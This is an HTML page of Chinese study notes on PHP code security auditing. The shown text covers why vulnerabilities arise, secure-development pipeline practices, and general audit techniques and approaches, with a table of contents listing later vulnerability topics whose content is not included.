<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Safe: PHP 代码审计</title>
<meta name="description" content="kubernetes, linux" />
<meta name="keywords" content="kubernetes, linux" />
<meta name="generator" content="Org Mode" />
<link rel="icon" href="/favicon.ico" type="image/x-icon">
<link rel="me" href="https://emacs.ch/@jasperhsu">
<meta name="google-adsense-account" content="ca-pub-1741779893655624">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1741779893655624" crossorigin="anonymous"></script>
<!-- from -->
<!--
<style>#back-to-top{background:#000;-webkit-border-radius:50%;-moz-border-radius:50%;border-radius:50%;bottom:20px;-webkit-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);-moz-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);box-shadow:0 2px 5px 0 rgba(0,0,0,.26);color:#fff;cursor:pointer;display:block;height:56px;opacity:1;outline:0;position:fixed;right:20px;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;-webkit-transition:bottom .2s,opacity .2s;-o-transition:bottom .2s,opacity .2s;-moz-transition:bottom .2s,opacity .2s;transition:bottom .2s,opacity .2s;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:56px;z-index:1}#back-to-top svg{display:block;fill:currentColor;height:24px;margin:16px auto 0;width:24px}#back-to-top.hidden{bottom:-56px;opacity:0}</style>
-->
<link rel="stylesheet" href="/static/aandds.com/css/main.css">
<link rel="stylesheet" href="/static/aandds.com/css/drollery.min.css">
<script type="text/javascript" src="/static/aandds.com/js/main.js"></script>
<!--
<script id="MathJax-script" async="" src="/static/aandds.com/js/mathjax.js"></script>

<script type="text/javascript" src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
-->
<script>
  window.MathJax = {
    tex: {
      ams: {
        multlineWidth: '85%'
      },
      tags: 'ams',
      tagSide: 'right',
      tagIndent: '.8em'
    },
    chtml: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    svg: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    output: {
      font: 'mathjax-modern',
      displayOverflow: 'overflow'
    }
  };
</script>

<script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
</script>
</head>
<body>
<div id="content" class="content">
<header>
<h1 class="title">Safe: PHP 代码审计</h1>
</header><nav id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#h:4f8bcf0f-6db5-49cf-9093-6767c374fa73">PHP代码审计</a>
<ul>
<li><a href="#h:b5dcf650-6d08-4b9c-9fa4-43219cd90fe5">为什么代码会有漏洞</a></li>
<li><a href="#h:f2664479-7305-494f-a8f2-9e5d4a00116f">什么是代码安全审计</a>
<ul>
<li><a href="#h:71761f55-ec59-4e57-8b4d-6478ec6e8e8d">安全分享</a></li>
</ul>
</li>
<li><a href="#h:e8758875-2f2a-4cb1-a804-4297f31718c5">代码安全审计技术</a>
<ul>
<li><a href="#h:6c055d57-392c-4630-9caa-d189091f4bf1">应用程序功能和业务规则</a></li>
<li><a href="#h:7df95d83-81e1-4d18-b485-a8989b171650">上下文</a></li>
<li><a href="#h:41edfb06-1058-4055-8860-9b6267bbc18d">敏感数据</a></li>
<li><a href="#h:763da2fd-5150-46fa-812e-8073b8c710ff">用户角色和访问权限</a></li>
<li><a href="#h:c4c955bc-75c4-4102-8ac9-f21e4811cce0">应用类型</a></li>
<li><a href="#h:07d61760-031e-44da-b168-11fb71d8d724">代码</a></li>
<li><a href="#h:4661253f-1309-4462-a723-5fdd5494353c">设计</a></li>
<li><a href="#h:757a5de5-9eec-4112-8751-d9375a2f753a">确定攻击面</a></li>
</ul>
</li>
<li><a href="#h:73b19677-e609-4006-93a5-8fbf442b777f">PHP代码审计思路</a>
<ul>
<li><a href="#h:39a775ed-a7bc-426a-9de3-ede88d8d192a">用户可控参数</a></li>
</ul>
</li>
<li><a href="#h:da475ddc-8b3a-4da2-b4b9-888112bb9e99">Composer安装</a></li>
</ul>
</li>
<li><a href="#h:84c68648-67fc-4ca8-b3f3-10ebf448d02a">THINKPHP框架输入变量</a>
<ul>
<li><a href="#h:4be97d62-05c8-434a-865e-32ee54ca46f6">概述</a></li>
<li><a href="#h:86d5f529-40eb-46cc-99a0-202ff230ded6">入口文件</a></li>
<li><a href="#h:ca0b4432-a680-4cf4-9fb6-b4b836a9dadd">MVC模式</a></li>
<li><a href="#h:9400a028-4c64-4ff9-a035-54ef4789f768">控制器</a></li>
<li><a href="#h:5e653ed5-65ed-4a52-a627-34dd762c2702">操作</a></li>
<li><a href="#h:98c7b73d-9a34-49b1-8599-08b4790d5d6f">检测变量是否设置</a></li>
<li><a href="#h:b889537f-9a50-4ddf-bbee-3edbe18f3fa3">变量获取</a>
<ul>
<li><a href="#h:8ba53f1b-8290-4de1-b88d-9b4b5b97d185">获取PARAM变量</a></li>
<li><a href="#h:4d4876f6-5fe2-41fb-901e-1c294439324a">获取GET变量</a></li>
<li><a href="#h:ae3e0c26-e38b-4422-a8ad-bf79ce058307">获取POST变量</a></li>
<li><a href="#h:538613f5-3214-49c6-9fd8-16d3df6f2984">获取PUT变量</a></li>
<li><a href="#h:cc73d254-48eb-4fac-9e0b-449732318238">获取REQUEST变量</a></li>
<li><a href="#h:76d3e0a7-e53f-416d-bf20-cd319d36d1c7">获取SERVER变量</a></li>
<li><a href="#h:0a10eea2-5320-4ceb-8a24-8f7fdf27d130">获取SESSION变量</a>
<ul>
<li><a href="#h:cc435f87-061b-4c8f-9b05-8416a358079f">安全分享</a></li>
</ul>
</li>
<li><a href="#h:4933c288-dcde-4eac-8b65-2c5fb18e5096">获取Cookie变量</a></li>
</ul>
</li>
<li><a href="#h:2b5a7947-8cd6-4882-ba08-d10328f4cd59">变量过滤</a></li>
<li><a href="#h:c2163427-b70b-4ddb-95ec-9a1126f28d4b">获取部分变量</a></li>
<li><a href="#h:fbec423a-babf-40d5-ab0d-2e3053cb7fce">排除部分变量</a></li>
<li><a href="#h:aac35fb1-4b0a-4cea-97b7-ee9024ea1832">变量修饰符</a></li>
<li><a href="#h:bf90978e-6889-485b-aff6-0f52665c96a5">原生查询</a>
<ul>
<li><a href="#h:a1460af5-5957-4b52-8b07-344916716a3b">query方法</a></li>
<li><a href="#h:b02cdcc9-3a91-4181-8e6c-66b0361d16b9">execute方法</a></li>
</ul>
</li>
<li><a href="#h:194cefec-42cb-4d64-860f-875089fcae54">参数绑定</a></li>
<li><a href="#h:478b49b8-81a9-4263-af43-71bdd0f24872">基本查询</a></li>
</ul>
</li>
<li><a href="#h:7e1a5b51-d8c2-4e36-b1e9-79734dd10496">漏洞讲解</a>
<ul>
<li><a href="#h:50204c69-de20-4003-83f9-61890894eff7">PHP敏感函数</a>
<ul>
<li><a href="#h:5d1ee97e-f887-4109-8d2a-b7339cf9067c">命令执行函数</a></li>
<li><a href="#h:f66c16d1-40d1-4b3e-b220-1368c21543a9">mail 函数</a></li>
<li><a href="#h:6bd9b26d-1694-412b-9907-58b867cd0b80">代码注入/文件包含函数</a></li>
</ul>
</li>
<li><a href="#h:598bb5ce-c04f-4e24-b2ae-eb2f2adebdfe">文件读取/SSRF函数</a></li>
<li><a href="#h:f357707e-19c4-4e48-b7fb-465e54b6cf05">文件上传/写入/其他函数</a>
<ul>
<li><a href="#h:0c052aba-c4df-4822-a26b-c3eca1a39f92">过滤函数</a></li>
</ul>
</li>
<li><a href="#h:4c46b139-01ca-4a67-86fb-d72a6bc3d4f1">命令注入</a>
<ul>
<li><a href="#h:5986f687-50f9-4625-9081-11253175d8d6">常见bash shell</a></li>
</ul>
</li>
<li><a href="#h:322961ff-c690-46ba-8a8a-374509c5b84b">文件包含</a></li>
<li><a href="#h:05c483b4-04f4-4baf-9e21-b2db08846904">SQL注入</a>
<ul>
<li><a href="#h:9bce2f32-1167-4636-8b94-0e9880937b24">例子</a></li>
<li><a href="#h:d0b769d2-6f76-41f4-9ae7-a7ee40507bc1">PHP PDO 预处理语句与存储过程</a></li>
<li><a href="#h:53436876-b484-4a09-96ad-0d2c1285720a">使用命名（:name）参数来准备SQL语句</a></li>
<li><a href="#h:1a90f8e2-d3c1-422c-8531-3093579fba81">使用问号（?）参数来准备SQL语句</a></li>
<li><a href="#h:84feef37-1de6-46c5-a551-c75ee0c71e2f">MySQLi 函数</a></li>
<li><a href="#h:9152a171-949d-4872-867b-c16faebe2805">mysql 扩展</a>
<ul>
<li><a href="#h:f3ddfb55-fa94-45df-94c0-12553e518d22">防护方法</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:952f1581-163b-4123-a883-309bded14af2">文件操作</a></li>
<li><a href="#h:9b34ebd5-d2e8-46b4-8c94-2ea23227942d">XSS</a>
<ul>
<li><a href="#h:d54c2e79-81af-4bc0-9bec-036b0e453224">安全分享</a></li>
<li><a href="#h:ac3f2834-28fc-48da-9b09-cc527f45e3d3">反射型XSS</a></li>
<li><a href="#h:47e9e743-84ef-4aa9-99e8-587b9db97965">php输出函数</a></li>
<li><a href="#h:7cc3a036-d4a1-4d93-a262-234d3c6e6805">储存型XSS</a>
<ul>
<li><a href="#h:54f2acfe-67f6-4b07-aaea-6d74c42cdb39">防护</a></li>
</ul>
</li>
<li><a href="#h:a33faad4-5f9d-4677-972c-6eb69d78c352">PHP设置csp</a></li>
</ul>
</li>
<li><a href="#h:255edf61-b606-4d2a-b81b-b58fdfba94b9">CSRF</a>
<ul>
<li><a href="#h:3e30d509-5a44-49d4-9efe-6c7fbf86f6b4">安全分享</a></li>
<li><a href="#h:987f99f3-ac90-42e8-81f6-937cee56f96c">表单请求</a></li>
<li><a href="#h:232c0a54-c765-4e0c-8cd3-b8ca1010b8cb">防护方法</a></li>
</ul>
</li>
<li><a href="#h:56e88d34-b6de-41ee-bdcd-d49ed6842ac5">XXE</a>
<ul>
<li><a href="#h:187b348d-9109-4e09-8dd0-168798e32ad7">描述</a></li>
<li><a href="#h:6bcc6e6f-09a0-42b9-ba5e-ed977e906c44">参数</a></li>
</ul>
</li>
<li><a href="#反序列化">反序列化</a>
<ul>
<li><a href="#h:63e191b7-1f6d-46e9-b50a-9bc7256954af">序列化</a></li>
<li><a href="#h:a167b31f-bb54-4f9d-b72b-5615b14110ff">反序列化</a></li>
</ul>
</li>
<li><a href="#h:278f8ca6-cd6f-41ce-ae0a-6d3a479390a4">其他漏洞</a></li>
<li><a href="#h:0d20343f-2f69-41f0-ba70-f7b6d5f94938">越权漏洞</a>
<ul>
<li><a href="#h:4180443e-2440-416a-856f-d38d79c96095">安全分享</a></li>
</ul>
</li>
<li><a href="#h:93f25464-e5e4-4c81-9648-77258981f9dd">拒绝服务</a></li>
</ul>
</li>
<li><a href="#h:d2b5d6df-e835-47a5-a5ec-d8f37572ab8f">PHP 框架</a>
<ul>
<li><a href="#h:3398dd78-1297-43d9-8e95-af7a061e1424">Laravel</a></li>
<li><a href="#h:bde611ec-55e2-4dfa-a451-714231ab3fdc">介绍</a></li>
<li><a href="#h:ef94d822-56d5-4dae-a819-0af09b994b71">根目录</a>
<ul>
<li><a href="#h:d8e7c3e7-0dda-4294-a165-f59eec0d0b13">App 目录</a></li>
<li><a href="#h:c1870069-bf33-4279-80ab-c9e437f8e7f3">Bootstrap 目录</a></li>
<li><a href="#h:dea68e60-a901-414a-83e0-4c40a046e70f">Config 目录</a></li>
<li><a href="#h:9584dad1-d811-4e91-8786-82a04ca7bc67">Database 目录</a></li>
<li><a href="#h:9bcab003-e0ad-45f3-9127-e008edc4427a">Lang 目录</a></li>
<li><a href="#h:ce3b05eb-6a10-40db-b32a-c0b03880c083">Public 目录</a></li>
<li><a href="#h:b4f5c624-ac59-4ce4-8d28-5927ff2dfb0a">Resources 目录</a></li>
<li><a href="#h:43ecc38f-318e-49cb-8adc-ce4d6dda5050">Routes 目录</a></li>
<li><a href="#h:abf7af7f-9792-4d6e-a966-57785667f1dd">Storage 目录</a></li>
<li><a href="#h:887ffe9e-4bbe-4600-8437-d62c03fbbd04">Tests 目录</a></li>
<li><a href="#h:aac91fab-d6cc-4ee1-a1d6-aab16972c6d4">Vendor 目录</a></li>
<li><a href="#h:4fa48dd4-57af-4584-8ccf-873d89f647dd">注意</a></li>
<li><a href="#h:27cc7f92-3b70-4d66-8c2e-52ec00ad22f8">入口</a></li>
</ul>
</li>
<li><a href="#h:b9df02e7-a36d-46f6-9df6-65de1cacb190">基本路由</a>
<ul>
<li><a href="#h:c0cb8938-e8aa-478f-b910-4be3d57ba879">默认路由文件</a></li>
<li><a href="#h:f94ec2c9-52a4-482d-9df5-4bf377b764f7">可用的路由方法</a></li>
<li><a href="#h:d2bcca97-7bfa-4ef7-8348-94dec7a8b180">依赖注入</a></li>
<li><a href="#h:83c07513-01a8-4fe3-adc6-1a86f29128d1">CSRF 保护</a></li>
<li><a href="#h:ce8dc675-ad7d-4382-9d87-0baabb460806">重定向路由</a></li>
<li><a href="#h:f73bb9b6-9d51-4c6c-b766-c1842da26de0">视图路由</a></li>
</ul>
</li>
<li><a href="#h:f6e2e169-833f-49b8-a4a9-de3d189b96a3">路由参数</a>
<ul>
<li><a href="#h:045cfae3-b935-43b6-8e06-1bdcfdc0a591">必填参数</a>
<ul>
<li><a href="#h:b2a109c5-7f6d-49ae-a0e4-ede2d746f6eb">参数和依赖注入</a></li>
</ul>
</li>
<li><a href="#h:48b1497a-5027-406c-aae6-aacd08820e12">可选参数</a></li>
<li><a href="#h:a70c96fc-314f-421d-9bea-bbc47e66a8a9">正则表达式约束</a>
<ul>
<li><a href="#h:82045dc5-638c-4d2f-b6fb-c86f3ee4bfd9">全局约束</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:db1d62da-059e-4c15-86f2-c43582ad87c7">命名路由</a>
<ul>
<li><a href="#h:6e9a9ec7-e95b-4a82-a0b2-76da51b817a1">生成命名路由的 URL</a></li>
</ul>
</li>
<li><a href="#h:04a3d8dd-61fe-4c08-a58d-b33e3584242d">路由组</a>
<ul>
<li><a href="#h:8a37bc32-1404-4187-a1cc-55c3d29fce1a">路由中间件</a></li>
<li><a href="#h:17ba9adc-fc2b-4c85-9a19-889494070a33">控制器</a></li>
<li><a href="#h:907957d7-b2b1-4ab0-93a5-5fb3fc4e8653">子域路由</a></li>
<li><a href="#h:0dfb326a-42f7-4392-91b8-62965608efb0">路由前缀</a></li>
<li><a href="#h:1e23bfb0-0cb7-425a-893f-7bcad212b7ac">隐式绑定</a></li>
<li><a href="#h:ecf8e573-2ba8-45d7-bbc5-ef18cd6a37fd">获取参数</a></li>
<li><a href="#h:bf55aef1-87cf-4fda-a186-3e0c0b503434">sql注入</a>
<ul>
<li><a href="#h:7fec154d-d9de-461a-b455-41080ee84709">使用命名绑定</a></li>
<li><a href="#h:c1e95214-4df4-4640-a234-63d0eae07124">执行 Insert 语句</a></li>
<li><a href="#h:0ee1d1d9-06ca-432c-bf53-458c9c0a216f">执行 Update 语句</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:6f632ee6-0858-439f-adfe-ba0999bcae1d">PHP 函数精讲</a>
<ul>
<li><a href="#h:3da5cf8c-4e2d-4af9-896a-fc66765a21a9">php代码审计工具</a>
<ul>
<li><a href="#h:494e4e59-7166-4d71-baec-7ce5ff6479ac">RIPS</a></li>
</ul>
</li>
<li><a href="#h:fc9fd758-a334-4012-ab6f-1c73f72bd736">1 extract变量覆盖</a></li>
<li><a href="#h:2b4f28de-9731-426d-9d8b-1b1b21e1f139">2 绕过过滤的空白字符</a></li>
<li><a href="#h:711d094a-e2bc-474c-bad3-87542bdfc469">3 多重加密</a></li>
<li><a href="#h:4f0227fc-8b2c-41ab-8ac8-c3e308dda9d1">4 SQL注入_WITH ROLLUP绕过</a></li>
<li><a href="#h:d2b6647d-79f0-4e44-b3e7-4bb7e2f36006">5 ereg正则%00截断</a></li>
<li><a href="#h:1a75de0b-df2a-4e37-8680-86dcd2955ed4">7 sha()函数比较绕过</a></li>
<li><a href="#h:257bcb5c-3ee7-4f73-82b1-6fc43ceb3782">8 SESSION验证绕过</a></li>
<li><a href="#h:97daa910-2762-4282-9e2b-3f4a56cd82a2">9 密码md5比较绕过</a></li>
<li><a href="#h:e15abb1d-6d4f-4988-b030-b936e16e9e9a">10 urldecode二次编码绕过</a></li>
<li><a href="#h:0e55213c-f905-434e-96c2-e55e33877dff">11 intval函数取整</a></li>
<li><a href="#h:b0255428-392d-4422-b5da-88bd7d24e836">12 jsonp劫持</a></li>
</ul>
</li>
</ul>
</div>
</nav>
<ul class="org-ul">
<li>TAGS: <a href="../index.html">Safe</a></li>
</ul>


<p>
<a href="12-code-audit-of-php-01.html">PHP 语言入门</a>
</p>

<p>
学习php的目的
</p>
<ul class="org-ul">
<li>明白之前学的漏洞在代码当中是怎么产生的。</li>
<li>以后看php代码时，明白功能逻辑有没有漏洞。</li>
<li>不需要我们会写php</li>
</ul>


<p>
主要内容：
</p>
<ul class="org-ul">
<li>为什么代码会有漏洞</li>
<li>什么是代码审计</li>
<li>代码安全审计技术详解、要求
<ul class="org-ul">
<li>应用程序功能和业务规则</li>
<li>上下文</li>
<li>敏感数据</li>
<li>应用角色和访问权限</li>
<li>应用类型</li>
<li>代码和设计</li>
<li>确定攻击面</li>
</ul></li>
<li>PHP 代码审计思路</li>
<li>PHP 包管理软件</li>
<li>ThinkPHP 框架讲解
<ul class="org-ul">
<li>入口文件</li>
<li>MVC 模式</li>
</ul></li>
</ul>
<section id="outline-container-h:4f8bcf0f-6db5-49cf-9093-6767c374fa73" class="outline-2">
<h2 id="h:4f8bcf0f-6db5-49cf-9093-6767c374fa73">PHP代码审计</h2>
<div class="outline-text-2" id="text-h:4f8bcf0f-6db5-49cf-9093-6767c374fa73">
</div>
<div id="outline-container-h:b5dcf650-6d08-4b9c-9fa4-43219cd90fe5" class="outline-3">
<h3 id="h:b5dcf650-6d08-4b9c-9fa4-43219cd90fe5">为什么代码会有漏洞</h3>
<div class="outline-text-3" id="text-h:b5dcf650-6d08-4b9c-9fa4-43219cd90fe5">
<p>
CWE 项目中大约有 1000 种不同的软件缺陷。这些都是软件开发人员使用不安全的方式执行代码逻辑所引发的安全问题。
</p>

<p>
<b>软件开发没有学习过安全知识，大多数人也没有接受过任何关于软件安全的培训。</b>
</p>

<p>
这些问题在最近几年变得非常重要，因为我们在以极快的速度增加互联方式，技术和协议。 <b>发明技术的能力已经远远超过了保护技术的能力。今天使用的许多技术根本没有受到足够(或任何)的安全审计。</b>
</p>

<p>
企业没有在安全上花费适当的时间有许多原因。最直观的原因是源于软件市场的一个潜在问题。
</p>

<p>
因为软件本质上是一个黑盒，客户很难区分安全和不安全代码。
</p>

<p>
没有这种可见性， 就不鼓励供应商花费额外的精力来生产安全的代码。
</p>
</div>
</div>
<div id="outline-container-h:f2664479-7305-494f-a8f2-9e5d4a00116f" class="outline-3">
<h3 id="h:f2664479-7305-494f-a8f2-9e5d4a00116f">什么是代码安全审计</h3>
<div class="outline-text-3" id="text-h:f2664479-7305-494f-a8f2-9e5d4a00116f">
<p>
代码审计旨在识别应用程序中与其特性和设计相关的安全缺陷，以及产生缺陷的根本原因。
</p>

<p>
随着应用程序的日益复杂和新技术的出现，传统的测试方法可能无法检测到应用程序中存在的所有安全缺陷。人们必须理解应用程序、外部组件和配置的代码，这样才能更好地发现缺陷。 <b>深入地研究应用程序代码也有助于确定可用于避免安全缺陷的缓解技术。</b>
</p>

<p>
<b>审核应用程序源代码的过程是为了验证适当的安全和逻辑控制是否存在，它们是否按预期工作，以及它们是否在正确的位置被调用。</b>
</p>

<p>
代码安全审计允许公司确保应用程序开发人员遵循安全开发技术。一般的经验法则是， 在应用程序经过适当的代码安全审计后，渗透测试不应发现与开发的代码相关的任何其他应用程序漏洞。或者发现很少的问题。
</p>
</div>
<div id="outline-container-h:71761f55-ec59-4e57-8b4d-6478ec6e8e8d" class="outline-4">
<h4 id="h:71761f55-ec59-4e57-8b4d-6478ec6e8e8d">安全分享</h4>
<div class="outline-text-4" id="text-h:71761f55-ec59-4e57-8b4d-6478ec6e8e8d">
<p>
如何做公司的安全？
</p>
<ul class="org-ul">
<li>控制代码层面的安全风险。
<ul class="org-ul">
<li>按漏洞类型来分有通过漏洞、逻辑漏洞，不漏洞的人力成本不一样，投资回报率（ROI）不一样。</li>
<li>按存量/增量来拆分。存量是从当前开始做之前代码都属于存量。
<ul class="org-ul">
<li>存量如何控制？ 批量做，增加人来做</li>
<li>增量如何控制？ 变化频繁不是铺人能搞定的。可以建立安全流程来控制，在研发流程中接入进来。
<ul class="org-ul">
<li>什么算新增代码？ 上线到公司生产环境的新代码算新增代码。</li>
</ul></li>
</ul></li>
</ul></li>
</ul>

<p>
上线流程中接入安全：
</p>
<ul class="org-ul">
<li>需求、开发、构建、测试、部署、线上环境</li>
<li>构建有ci平台，部署有cd平台，开发有git。每个上面会有动作，git 有pull/push/merge，ci 有构建，cd有部署</li>
<li>各阶段问题：
<ul class="org-ul">
<li>部署阶段卡点问题：1.研发修复漏洞成本高 2.测试的工作量增大 3.安全测试的时间很少 4.修复漏洞时间很少 5. 绕过卡点上线</li>
<li>构建阶段卡点问题：1.构建频率很高，审计成本增加 2.如果有自动扫描，但扫描报告增多，则审计成本增加</li>
</ul></li>
<li>各阶段问题解决：
<ul class="org-ul">
<li>安全：纵深防御。不在一个点去解决所有的安全问题，而是在每个点上都做安全策略，然后去层层治理层层管控从而解决所有的安全问题。</li>
<li>部署时做卡点，但要降低漏过的量降到5%或3%，就提前感知到漏洞。提前感知漏洞就需要在每个阶段去做。</li>
<li>测试时做墨盒扫描，把测试的流量拿过来做墨盒扫描来发现安全问题</li>
<li>ci平台构建时嵌入代码扫描做风险告知，有漏洞直接展示，但没有审计，让研发知道会在部署上线时卡你。</li>
<li>开发阶段时在ide上做一个代码扫描插件，在开发时就能提醒</li>
<li>需求中可以做一些可能会生产高风险的漏洞识别，做一些风险通知。如做一个登录功能，就列举登录中的安全风险（暴力破解要加验证码、用户名枚举、密码明文传输）</li>
</ul></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:e8758875-2f2a-4cb1-a804-4297f31718c5" class="outline-3">
<h3 id="h:e8758875-2f2a-4cb1-a804-4297f31718c5">代码安全审计技术</h3>
<div class="outline-text-3" id="text-h:e8758875-2f2a-4cb1-a804-4297f31718c5">
<p>
代码安全审计与被审计的应用程序强相关。它们可能会突出一些新的或特定于应用程序代码实现的缺陷，如执行流的不安全终止、同步错误等。 <b>这些缺陷只有当我们理解了应用程序代码流及其逻辑后才能被发现</b> 。因此，代码安全审计不仅仅是扫描代码中的一组未知的不安全代码模式，还包括理解应用程序的代码实现和列举它独有的缺陷。（ps 代码审计中找业务逻辑的安全问题，但大部分公司都没有做这么好，大部分公司还都是只是一些通用的web漏洞）
</p>

<p>
正在审计的应用程序可能已经设计了一些适当的安全控制，例如集中黑名单、输入验证等。必须仔细研究这些安全控制措施，以确定它们是否可靠。根据控制的实施，必须分析攻击的性质或任何可用于绕过它的特定攻击向量。
</p>

<p>
<b>列举现有安全控制中的弱点是代码安全审计的另一个重要方面。</b>
</p>

<p>
应用程序中出现安全缺陷有多种原因，比如缺少输入验证或参数处理不当。在代码审计的过程中， <b>缺陷的根本原因需要被暴露出来，要跟踪完整的数据流</b> 。确定应用程序(源)的所有可能的输入，以及它们是如何被应用程序(接收器)处理的。接收器可能是一种不安全的代码模式，如动态 SQL 查询、日志编写器或对客户端设备的响应。
</p>

<p>
考虑一个源是用户输入的场景。它流经应用程序的不同类/组件，最后落入一个拼接的SQL 查询(一个接收器)中，并且在路径中没有对它进行适当的验证。在这种情况下，应用程序将容易受到 SQL 注入攻击，这是由源到目的分析确定的。这种分析有助于理解哪些易受攻击的输入可能导致应用程序中的漏洞。
</p>

<p>
一旦发现缺陷，审计者必须列举应用程序中存在的所有可能的实例。这不是由代码变更发起的代码审计，这是由管理部门基于发现的缺陷发起的代码扫描，并且投入资源来查找该缺陷是否存在于产品的其他部分。例如，由于在不安全的显示方法中使用未经验证的输入，应用程序很容易在这些地方受到 XSS 漏洞的攻击。
</p>
</div>
<div id="outline-container-h:6c055d57-392c-4630-9caa-d189091f4bf1" class="outline-4">
<h4 id="h:6c055d57-392c-4630-9caa-d189091f4bf1">应用程序功能和业务规则</h4>
<div class="outline-text-4" id="text-h:6c055d57-392c-4630-9caa-d189091f4bf1">
<p>
审计人员应了解应用程序当前提供的所有功能，并获取与这些功能相关的所有业务限制规则。还有一种情况是，要注意潜在的计划中的功能，这些功能可能会出现在应用程序的路线图上，从而在当前的代码审计过程中对安全决策进行提前验证。这个系统失败的后果是什么？如果应用程序不能按预期执行其功能，企业会受到很大影响吗？
</p>
</div>
</div>
<div id="outline-container-h:7df95d83-81e1-4d18-b485-a8989b171650" class="outline-4">
<h4 id="h:7df95d83-81e1-4d18-b485-a8989b171650">上下文</h4>
<div class="outline-text-4" id="text-h:7df95d83-81e1-4d18-b485-a8989b171650">
<p>
所有的安全都在我们试图保护的范围内。在苹果的应用程序上推荐军事安全标准机制将是矫枉过正不恰当的。什么类型的数据被操纵或处理，如果这些数据被泄露会对公司造成什么损害？上下文是安全代码审计和风险评估的“圣 杯”。
</p>
</div>
</div>
<div id="outline-container-h:41edfb06-1058-4055-8860-9b6267bbc18d" class="outline-4">
<h4 id="h:41edfb06-1058-4055-8860-9b6267bbc18d">敏感数据</h4>
<div class="outline-text-4" id="text-h:41edfb06-1058-4055-8860-9b6267bbc18d">
<p>
审计人员还应记录对应用程序敏感的数据实体，如账号和密码。根据敏感度对数据实体进行分类将有助于审计者确定应用程序中任何类型的数据丢失的影响。
</p>
</div>
</div>
<div id="outline-container-h:763da2fd-5150-46fa-812e-8073b8c710ff" class="outline-4">
<h4 id="h:763da2fd-5150-46fa-812e-8073b8c710ff">用户角色和访问权限</h4>
<div class="outline-text-4" id="text-h:763da2fd-5150-46fa-812e-8073b8c710ff">
<p>
了解被允许访问应用程序的用户类型很重要。是面向外部还是内部给“信任”的用户？ 一般来说，只有组织内部用户才能访问的应用程序可能与互联网上任何人都能访问的面临不同的威胁。因此，了解应用程序的用户及其部署的环境将允许审计者正确认识威胁。除此之外，还必须了解应用程序中存在的不同权限级别。这将有助于审计者列举适用于应用程序的不同安全违规/权限提升攻击。
</p>
</div>
</div>
<div id="outline-container-h:c4c955bc-75c4-4102-8ac9-f21e4811cce0" class="outline-4">
<h4 id="h:c4c955bc-75c4-4102-8ac9-f21e4811cce0">应用类型</h4>
<div class="outline-text-4" id="text-h:c4c955bc-75c4-4102-8ac9-f21e4811cce0">
<p>
这是指了解应用程序是基于浏览器的应用程序、基于桌面的独立应用程序、网络服务、移动应用程序还是混合应用程序。不同类型的应用程序面临不同类型的安全威胁，了解应用程序的类型将有助于审计者查找特定的安全缺陷，确定正确的威胁代理，并突出适合应用程序的必要控制。
</p>
</div>
</div>
<div id="outline-container-h:07d61760-031e-44da-b168-11fb71d8d724" class="outline-4">
<h4 id="h:07d61760-031e-44da-b168-11fb71d8d724">代码</h4>
<div class="outline-text-4" id="text-h:07d61760-031e-44da-b168-11fb71d8d724">
<p>
使用的语言，从安全角度看该语言的特点和问题。从安全性和性能的角度来看，程序员需要注意的问题和语言最佳实践。
</p>
</div>
</div>
<div id="outline-container-h:4661253f-1309-4462-a723-5fdd5494353c" class="outline-4">
<h4 id="h:4661253f-1309-4462-a723-5fdd5494353c">设计</h4>
<div class="outline-text-4" id="text-h:4661253f-1309-4462-a723-5fdd5494353c">
<p>
一般来说，如果使用 MVC 设计原则开发，网络应用程序有一个定义良好的代码布局。应用程序可以有自己的定制设计，也可以使用一些著名的设计框架，如 Struts/Spring 等。
</p>

<p>
应用程序属性/配置参数存储在哪里？
如何为任何功能/URL 识别业务类别？
什么类型的类被执行来处理请求(例如。集中式控制器、命令类、视图页面等)？
对于任何请求，视图是如何呈现给用户的？
</p>
</div>
</div>
<div id="outline-container-h:757a5de5-9eec-4112-8751-d9375a2f753a" class="outline-4">
<h4 id="h:757a5de5-9eec-4112-8751-d9375a2f753a">确定攻击面</h4>
<div class="outline-text-4" id="text-h:757a5de5-9eec-4112-8751-d9375a2f753a">
<p>
通过分析输入、数据流和事务来确定攻击面。实际执行代码安全审计的主要部分是对攻击面进行分析。应用程序接受输入并产生某种输出。第一步是识别代码的所有输入。
</p>

<p>
应用程序的输入可能包括以下要点:
</p>
<ul class="org-ul">
<li>浏览器输入：一般是 GET POST 请求参数</li>
<li>Cookie：如果是用户请求时带的，那是可以修改的</li>
<li>文件</li>
<li>命令行参数</li>
<li>环境变量</li>
</ul>

<p>
以上所有都是讲概念，来指导我们怎么去做的。
我们要理解它底层的原理和我们在企业中的定位，然后思考出一套方案，根据所在企业现状来落地，完成一个闭环。
</p>
</div>
</div>
</div>
<div id="outline-container-h:73b19677-e609-4006-93a5-8fbf442b777f" class="outline-3">
<h3 id="h:73b19677-e609-4006-93a5-8fbf442b777f">PHP代码审计思路</h3>
<div class="outline-text-3" id="text-h:73b19677-e609-4006-93a5-8fbf442b777f">
<ul class="org-ul">
<li>敏感函数方法回溯(反向审计)
<ul class="org-ul">
<li>查找项目中的敏感函数方法，查找传入的参数判断用户是否可控</li>
</ul></li>
<li>用户可控参数正向查找
<ul class="org-ul">
<li>查找项目中的用户输入、追踪用户输入，判断是否得到有效的过滤/调用敏感函数/存在逻辑问题</li>
</ul></li>
<li>关键业务功能分析(功能审计)
<ul class="org-ul">
<li>专门审计易出现漏洞的关键功能点
<ul class="org-ul">
<li>如 头像上传、系统登陆、文件下载等功能</li>
</ul></li>
</ul></li>
